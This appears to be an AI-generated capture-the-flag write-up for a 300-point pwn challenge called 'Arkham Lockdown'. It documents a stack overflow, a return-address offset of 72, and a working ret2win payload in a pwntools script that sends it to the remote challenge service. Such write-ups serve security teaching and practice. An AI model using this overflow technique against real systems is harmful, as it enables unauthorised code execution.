# Arkham Lockdown

## Challenge identity

- **Points:** 300
- **Category:** pwn
- **Status:** **CONFIRMED SOLVED**
- **Confirmed flag:** `pbctf{BATMAN_IS_NOT_GAY}`

The supplied scoreboard independently lists Arkham Lockdown as `pwn`, value `300`.

## Original question

> **Arkham Lockdown**  
> **300**  
> 0 0  
> `nc 172.198.160.128 1339`
>
> solve this

## High-level overview

The target was a menu-driven “cell door controller.” Menu option 2 copied attacker-controlled input into a stack buffer without enforcing the buffer length. The service’s corrupted-stack output revealed that the saved return address began 72 bytes after the input buffer.

The binary was non-PIE: code addresses remained in the fixed `0x401xxx` range. Redirecting the saved return address to `0x401290` invoked the master-override/ret2win function, which printed the flag.

## Step-by-step procedure

### 1. Connect to the service

```bash
nc 172.198.160.128 1339
```

### 2. Select the vulnerable path

Choose option `2`.

Short inputs returned to the menu. Larger inputs corrupted or terminated the connection, identifying the command parser as the likely overflow.

### 3. Recover the stack layout

The service leak placed:

```text
buffer       = bytes 0..63
saved RBP    = bytes 64..71
saved RIP    = bytes 72..79
```

Therefore:

```text
saved RIP offset = 72
```

### 4. Identify the ret2win function

The ordinary return address was in the fixed `0x4015xx` region, showing that PIE was disabled. Focused address probing identified:

```text
master_override = 0x401290
```

### 5. Build the payload

```python
payload = b"A" * 72 + (0x401290).to_bytes(8, "little")
```

Equivalent pwntools reproduction:

```python
from pwn import *

io = remote("172.198.160.128", 1339)
io.sendline(b"2")
io.sendline(b"A" * 72 + p64(0x401290))
print(io.recvall(timeout=3).decode(errors="replace"))
```

Add `recvuntil()` calls if prompt synchronization is required.

### 6. Validate

The remote service executed the master-override function and printed:

```text
pbctf{BATMAN_IS_NOT_GAY}
```

## Skills and workflows used

- `solve-challenge`
- `ctf-pwn`
- Blind ret2win/BROP-style reconnaissance

## Tools and services used

- Netcat/ncat-style TCP probing
- Python
- pwntools-style payload construction
- Little-endian 64-bit packing
- Remote PBCTF service

No local challenge binary was required.

## Evidence and controls

- Short input behaved normally.
- Long input corrupted the connection.
- The leaked stack layout independently fixed the RIP offset at 72.
- Stable `0x401xxx` addresses showed non-PIE code.
- `0x401290` produced a semantically distinct master-override response.
- The flag came from the remote service itself.

## Files created

No surviving exploit script was saved.

## Rejected or unconfirmed candidates

None.

## Diagram

The exploit is simple enough not to need a separate Excalidraw file:

```text
64-byte buffer → saved RBP at +64 → saved RIP at +72
                                        │
                                        └── overwrite with 0x401290
                                                     ↓
                                             master override
                                                     ↓
                                               remote flag
```
